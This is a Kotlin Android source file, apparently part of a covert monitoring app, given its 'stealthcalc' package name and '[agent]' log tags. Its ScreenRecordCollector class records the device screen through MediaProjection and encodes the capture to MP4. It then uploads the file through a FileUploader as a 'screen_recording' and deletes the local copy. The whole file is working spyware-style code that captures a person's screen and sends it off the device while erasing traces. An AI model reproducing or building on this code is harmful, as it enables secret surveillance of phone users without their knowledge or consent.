package com.stealthcalc.monitoring.collector

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaCodec
import android.media.MediaCodecInfo
import android.media.MediaFormat
import android.media.MediaMuxer
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.util.DisplayMetrics
import android.view.Surface
import android.view.WindowManager
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.network.FileUploader
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class ScreenRecordCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
    private val uploader: FileUploader,
) {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaCodec: MediaCodec? = null
    private var muxer: MediaMuxer? = null
    private var isRecording = false

    fun setMediaProjection(resultCode: Int, data: Intent) {
        val manager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = manager.getMediaProjection(resultCode, data)
    }

    @SuppressLint("WrongConstant")
    suspend fun recordScreen(durationMs: Long = 30_000L): Boolean = withContext(Dispatchers.IO) {
        if (isRecording) return@withContext false
        val projection = mediaProjection ?: return@withContext false

        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(metrics)

        val scale = 0.5f
        val width = ((metrics.widthPixels * scale).toInt() / 2) * 2
        val height = ((metrics.heightPixels * scale).toInt() / 2) * 2
        val density = metrics.densityDpi
        val bitRate = 2_000_000
        val frameRate = 15

        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val file = File(context.cacheDir, "screen_record_$timestamp.mp4")

        val format = MediaFormat.createVideoFormat(MediaFormat.MIMETYPE_VIDEO_AVC, width, height).apply {
            setInteger(MediaFormat.KEY_BIT_RATE, bitRate)
            setInteger(MediaFormat.KEY_FRAME_RATE, frameRate)
            setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface)
            setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 2)
        }

        val codec = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC)
        codec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)

        val inputSurface: Surface = codec.createInputSurface()
        val mux = MediaMuxer(file.absolutePath, MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4)

        val display = projection.createVirtualDisplay(
            "screenrecord", width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            inputSurface, null, null
        )

        mediaCodec = codec
        muxer = mux
        virtualDisplay = display
        isRecording = true

        codec.start()

        var trackIndex = -1
        var muxerStarted = false
        val bufferInfo = MediaCodec.BufferInfo()
        val endTime = System.currentTimeMillis() + durationMs

        AppLogger.log(context, "[agent]", "Screen recording started (${durationMs / 1000}s)")

        while (System.currentTimeMillis() < endTime && isRecording) {
            val outputIndex = codec.dequeueOutputBuffer(bufferInfo, 10_000)
            when {
                outputIndex == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED -> {
                    trackIndex = mux.addTrack(codec.outputFormat)
                    mux.start()
                    muxerStarted = true
                }
                outputIndex >= 0 -> {
                    val buffer = codec.getOutputBuffer(outputIndex) ?: continue
                    if (muxerStarted && bufferInfo.size > 0) {
                        buffer.position(bufferInfo.offset)
                        buffer.limit(bufferInfo.offset + bufferInfo.size)
                        mux.writeSampleData(trackIndex, buffer, bufferInfo)
                    }
                    codec.releaseOutputBuffer(outputIndex, false)
                    if (bufferInfo.flags and MediaCodec.BUFFER_FLAG_END_OF_STREAM != 0) break
                }
            }
        }

        codec.signalEndOfInputStream()
        delay(500)

        var draining = true
        while (draining) {
            val idx = codec.dequeueOutputBuffer(bufferInfo, 5_000)
            if (idx >= 0) {
                val buf = codec.getOutputBuffer(idx)
                if (buf != null && muxerStarted && bufferInfo.size > 0) {
                    buf.position(bufferInfo.offset)
                    buf.limit(bufferInfo.offset + bufferInfo.size)
                    mux.writeSampleData(trackIndex, buf, bufferInfo)
                }
                codec.releaseOutputBuffer(idx, false)
                if (bufferInfo.flags and MediaCodec.BUFFER_FLAG_END_OF_STREAM != 0) draining = false
            } else {
                draining = false
            }
        }

        display.release()
        codec.stop()
        codec.release()
        if (muxerStarted) mux.stop()
        mux.release()
        isRecording = false

        val success = uploader.uploadFile(
            file = file,
            mimeType = "video/mp4",
            category = "screen_recording",
            capturedAt = System.currentTimeMillis(),
        )
        file.delete()

        if (success) {
            AppLogger.log(context, "[agent]", "Screen recording uploaded")
        }
        success
    }

    fun release() {
        isRecording = false
        virtualDisplay?.release()
        mediaCodec?.release()
        runCatching { muxer?.release() }
        mediaProjection?.stop()
        mediaProjection = null
    }
}
